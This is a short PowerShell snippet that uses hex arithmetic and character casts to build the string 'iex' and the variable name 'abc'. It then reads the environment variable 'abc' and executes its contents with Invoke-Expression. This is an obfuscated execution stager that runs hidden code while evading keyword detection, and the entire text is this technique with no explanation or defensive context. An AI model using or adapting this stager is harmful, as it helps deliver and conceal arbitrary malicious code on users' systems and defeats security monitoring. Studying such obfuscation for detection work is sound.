$x=0x10
$x*=6
$x=[char]($x+9)
$y=0x10
$y*=6
$y=[char]($y+5)
$z=0x10
$z*=7
$z=[char]($z+8)
$t=$x+$y+$z

$x=0x61
$x=[char]($x)+[char]($x+1)+[char]($x+2);
$y=[System.Environment]::GetEnvironmentVariable($x)
iex $y;
